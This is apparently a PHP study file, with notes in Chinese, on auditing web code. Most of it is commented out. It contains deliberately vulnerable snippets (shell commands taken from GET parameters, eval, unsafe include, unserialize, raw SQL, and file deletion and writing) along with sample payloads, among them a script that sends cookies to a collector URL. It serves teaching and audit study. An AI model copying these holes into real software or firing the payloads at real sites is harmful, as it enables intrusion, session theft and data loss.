<?php
/*调试函数
echo '';
print_r '';
exit();
*/
/**************************************************************************************************************************/
/* 全局的变量列子
 $GLOBALS 
$moon="1";
echo $GLOBALS['moon'];
function test()
{
echo $moon="2";
echo $GLOBALS['moon']; — 引用全局作用域中可用的全部变量
}
$moon="1";
test();
*/
//print_r($_SERVER); — 服务器和执行环境信息
//print_r($_GET);    — HTTP GET 变量
//print_r($_POST);   — HTTP POST 变量
//print_r($_FILES);  — HTTP 文件上传变量
//print_r($_COOKIE); — HTTP Cookies
//print_r($_REQUEST); — HTTP Request 变量
//$_SESSION['aaaa']='aaaaaaa';
//print_r($_SESSION);  — Session 变量
//print_r($_ENV['[OS]']="aaaaaaa"); — 环境变量
/**************************************************************************************************************************/
/*命令注入*/
/*
$action=$_GET['cmd'];
echo "<pre>";
*/
//system($action);  执行cmd命令并且返回
//passthru($action); 执行cmd命令并且返回
//echo exec($action); 执行cmd命令无返回 需echo输出 ps只能输出返回值的第一行
//echo shell_exec($action);  执行cmd命令无返回 需加入echo会全部输出
//echo popen($action,'r');  执行cmd命令无返回  加入echo只会返回Resource id #2 证明有注入点
//proc_open(cmd, descriptorspec, pipes) shell执行
/*命令注入防御将命令进行转移  escapeshellcmd   escapeshellarg  如showdown /s 变成shutdown //s 导致执行失败
 echo shell_exec(escapeshellcmd($action));
 echo shell_exec(escapeshellarg(arg)($action));
*/
 /*
echo "<pre/>";
*/
/**************************************************************************************************************************/
/*代码执行注入
常见 eval 、assert、preg_replace
*/

/* eval、assert的用法  http://127.0.0.1/?moon=phpinfo() */
/*
if (isset($_GET['moon'])) isset判断不等于null
{
$moon=$_GET['moon'];
//eval("\$moon=$moon;");   执行并输出 等同于 echo($moon=phpinfo());
//assert("\$moon=$moon;");  与eval用法相同
}
*/

/*正则代码执行*/
/*
echo $regexp = $_GET['reg'];
$var = '<php>phpinfo()</php>';
var_dump(preg_replace("/<php>(.*?)$regexp", '\\1', $var));
*/
//preg_replace("/moon/e", $_GET['moon'], "moon")
//preg_replace("/\s*\[php\](.+?)\[\/php\]\s*/ies","\\1",$_GET['moon']); 
/**************************************************************************************************************************/
/* xss反射漏洞*/
/*变量的直接输出*/
//echo $_GET['xss']; // ?xss=<script>alert(1)</script>  //输出1
                     // ?xss=<script>alert(document.cookie);</script> 获取cookie
//用法 调取cooki  <script>vari=newImage;i.src="http://127.0.0.1/xss.php?c="%2bdocument.cookie;</script>
//echo $_SERVER['PHP_SELF'];  显示地址路径 在网址后加入<script>alert(1)；</script>即可注入 
//echo($_SERVER['HTTP_USER_AGENT']); 显示浏览器版本 将User-Agent头更换即可注入
//echo($_SERVER['HTTP_REFERER']);   显示浏览器返回路径 将Referfer头更换即可注入
//echo(urldecode($_SERVER['REQUEST_URI'])); 输出网址路径 加入？更代码即可注入
/**************************************************************************************************************************/
/*存储型xss漏洞*/
/*提交评论例子*/
/*mysql在test数据库下创建一个book的表
CREATE TABLE `book`
(
`id` int(5) NOT NULL auto_increment,
`title` varchar(32) NOT NULL,
`con` text NOT NULL,
PRIMARY KEY (`id`)
)
ENGINE=MyISAM
DEFAULT
CHARSET=gbk
AUTO_INCREMENT=1
;*/
/*留言板例子
mysql_connect('localhost','root','root');
mysql_select_db('test');
mysql_query("set names gbk");
if (isset($_POST['submit'])) {
	# code...
	$title=$_POST['title'];
	$con=$_POST['con'];
	$sql="INSERT INTO `book` (`id`,`title`,`con`) VALUES (NULL,'$title','$con');";
    if (mysql_query($sql)) {
    	# code...
    	echo("留言成功");
    }else
    {
    	echo("留言失败");
    }
}else
{
 $sql="select * from book;";
 if ($row=mysql_query($sql)) {
 	# code...
 	while ($rows=mysql_fetch_array($row)) {
 		# code...
 		//echo($rows['id'].$rows['title'].$rows['con']."<br>");
 		echo htmlspecialchars($rows['id'].$rows['title'].$rows['con'])."<br>"; //htmlspecialchars()转义不会当成一个css语句执行类似"$resu"
 	}
 }
}
?> 
/*前端HTML代码
<!DOCTYPE html>
<html>
<h1>留言板</h1>
<head>
	<meta charset="utf-8">
	<title>php代码审计xxs存储型漏洞</title>
</head>
<body>
<form action="?action=insert" method="POST">
标题：<input type="text" name="title"><br>	
内容：<textarea name="con"></textarea>
<input type="submit" name="submit" value="提交">
</form>
</body>
</html>
*/
/**************************************************************************************************************************/
/*本地包含和远程包含*/
//远程保函需要将php.in内设为allow_url_include=On;
//伪协议php://input 
//输入?file=php://input 将要执行代码发送POST包 ps许保证可以远程保函
//伪协议php http://127.0.0.1/?file=php://filter/read=convert.base64-encode/resource=1.txt ps:无需开启远程保函 需要解码base64 
/*
if (isset($_GET['file'])) {
	# code...
	$file=$_GET['file'];
	include $file;    // 执行一个本地文件里或外部网站某个文件的内容的内容
	//include $file.".php"; //?file=1.txt%00使用个%00截断  ?file=http://127.0.0.1/webshell.php? 使用？截断
}
*/
/**************************************************************************************************************************/
/*sql注入*/ 
/*转义
mysql_real_escape_string(unescaped_string);
addslashes(str);*/
/*
mysql_connect('localhost','root','root');
mysql_select_db('test');
mysql_query("set name gbk");
echo $id=$_GET['id'];
echo("<hr>");
echo($sql="select * from book where id=$id;");
echo("<hr>");
if ($row=mysql_query($sql)) {
	# code...
	$rows=mysql_fetch_array($row);
	var_dump($rows);
}
/**************************************************************************************************************************/
/*CSRF跨站请求伪造*/
//理解盗用你的身份，以你的名义发送恶意请求

/*建表admin
CREATE TABLE `admin`(
`id` int(5) unsigned NOT NULL auto_increment,
`name` varchar(40) NOT NULL,
`pass` varchar(40) NOT NULL,
PRIMARY KEY(`id`)
)ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=6;*/
/*登入账号密码例子需配合1.html*/
/*
 mysql_connect('localhost','root','root');
 mysql_select_db('test');
 mysql_query("set names gbk");
 if (isset($_POST['sub'])) {
 	# code...
 	$name=$_POST['name'];
 	$pass=$_POST['pass'];
 	$sql="insert into `admin`(`id`,`name`,`pass`) values(NULL,'$name','$pass');"; 
 	if ($row=mysql_query($sql)) {
 		# code...
 		echo('OK');
 	}else
 	{
 		echo('NO');
 	}
 }else{
 	$sql="select * from admin";
 	if ($row=mysql_query($sql)) {
 		# code...
 		while ($rows=mysql_fetch_array($row)) {
 			# code...
 			echo("name:$rows[name]   pass:$rows[pass]<br>");
 		}
 	}
 }
?>
<form action="" method="post">
	name:<input type="text" name="name"><br>
	pass:<input type="password" name="pass">
	<input type="submit" value="OK" name="sub">
</form>*/
/**************************************************************************************************************************/
/*动态函数执行
function a()
{
	echo("a");
}
 function b()
 {
 	echo("b");
 }
 function c($c)
 {
 	echo("c");
 	$c();      //调取其他函数 即?c=system('dir');
 }
c($_GET['c'])
*/
/*匿名函数
$a=$_GET['a'];
$lambda=create_function('$a,$b', 'return(strlen($a)-strlen($b)+'."strlen($a));"); //匿名函数
var_dump($lambda);
$array=array('reall long string here,boy','this','mididng length','larget');
usort($array, $lambda);//应用函数排序
print_r($array);
*/
/*$lambda匿名函数的意思
function lamnda($a,$B)
{
	return strelen($a)-strelen($b)+strlen($a);  
	//注入语句http://127.0.0.1/?a=1));}system(%27dir%27);//
	// 即return strelen(1));}system(%27dir%27);//)-strelen($b)+strlen($a);  闭合后面函数 
}
*/
/**************************************************************************************************************************/
/*反序列化漏洞*/
/*
class demo {
	var $test="moonsec";
	function _destruct(){
		eval($this->test);
	}
}
unserialize($_GET['code']);  //反序列化函数 对序列化参数进行操作体会变量值 回调_destruct()的内容
*/
/*
class demo{
	var $test="phpinfo();";
}
$classs= new demo();
print_r(serialize($classs));
//O:4:"demo":1:{s:4:"test";s:10:"phpinfo();";}
*/

/**************************************************************************************************************************/
/*覆盖变量漏洞*/
/*全局变量的取值与赋值
echo($a='b');
echo "<hr>";
//echo $GLOBALS['a'];
echo $GLOBALS['a']="c";
echo "<hr>";
echo $a;
*/
/*覆盖变量例子  register_globals=on的情况下有效 ？moon=1
if (isset($moon)) {
	# code...
	echo "yes";
}else
{
	echo "no";
}
*/
/*
$moon="1";
if ($moon) {
	# code...
	echo $moon;
}
*/
/*人为注入全局变量*/
/*foreach (array('_GET','_POST') as $request) {
	# code...
	foreach ($$request as $key => $value) {  
		# code...
		echo($$key=$value);  //可可变量 
	}
}
echo($moon);*/
//print_r($_GET);
/*上述代码解析 $$为可可变量 即 $a='c';    $$a='b'; ==  $c='b';
1、将'_GET','_POST' 存数组 foreach 循环输出  
2、循环输出时用可可变量$$request即 $_GET,$_POST foreach 出结果为 Array ( [moon] => 1 )  即 $key='moon'  $value=1
3、echo($$key=$value) 即 $moon=1; 造成变量覆盖
*/
/**************************************************************************************************************************/
/*文件管理漏洞
常见函数： 
copy rmdir unlink delete fwrite fopen chmod fgetc fgetscv fgets fgetss file file_get_contents fread readfile ftruncate file_put_contens fputcsv fputs fopen 
作用 增 删 改 查
*/
/*
$file=$_GET['file'];
if (is_file($file)) { //判断文件是否存在
	# code...
	unlink($file); //删除文件函数 ?file=../../demo.php 即可删除上层文件 
}
*/
/* ../../跨级访问漏洞
$file =$_GET['file'];
//echo file_get_contents($file); //文件读取
//echo readfile($file); //文件读取并显示行数
$txt=$_GET['txt'];
//file_put_contents($file, $txt);//文件写入
//copy($file, $txt); //文件复制
fwrite(fopen($file, "a+"), $txt);//  文件写入
*/
/**************************************************************************************************************************/
/*文件上传漏洞*/
/*简单文件上传代码
print_r($_FILES);
?>
<form method="post" name="upform" action="" enctype="multipart/form-data">
	<input type="file" name="uploadfile">
	<input type="submit" name="upload" value="upload">
</form>
</body>
*/
/*FILES 存储信息
//print_r($_FILES['uploadfile']);
Array
(
    [uploadfile] => Array
        (
            [name] => 新建文本文档.txt
            [type] => text/plain
            [tmp_name] => C:\Users\Administrator\AppData\Local\Temp\php1D69.tmp
            [error] => 0
            [size] => 55
        )

)*/
/*上传例子 
防御：
1、使用使用白名单方式检测文件后缀名
2、上传后按时间能算法生成文件名字
3、上传目录脚本文件不可执行
4、注意%00截断
5、Content-Type验证 下列例子就是 注：可通过Burp绕过
if (isset ($_POST['upload']) && !empty($_POST['upload'])) { //empty检查一个值是否为空 为空放回ture
	# code...
	if ($_FILES['uploadfile']['type'] != "image/jpeg") {
		# code...
		exit('EEOR:上传文件不是正确图像！');
	}else{
		$upfile="upfile"."/".rand(1,5).$_FILES['uploadfile']['name'];  //文件位置
		if (is_uploaded_file($_FILES['uploadfile']['tmp_name'])) {  //判断文件是否是通过 HTTP POST 上传的
			# code...
			if (!move_uploaded_file($_FILES['uploadfile']['tmp_name'], $upfile)) { //将上传的文件移动到新位置
				# code...
				echo('出错！！移动文件失败');
				exit();
			}else{
				echo("上传成功路径是：$upfile");
			}
		}
	}
}
?>
<!DOCTYPE html>
<html>
<meta charset="utf-8">
<head>
	<title>服务端验证绕过（content_Type 类型绕过）</title>
</head>
<body>
<form method="post" name="upform" action="" enctype="multipart/form-data">
	<input type="file" name="uploadfile">
	<input type="submit" name="upload" value="upload">
</form>
</body>
</html>
*/
/**************************************************************************************************************************/
?>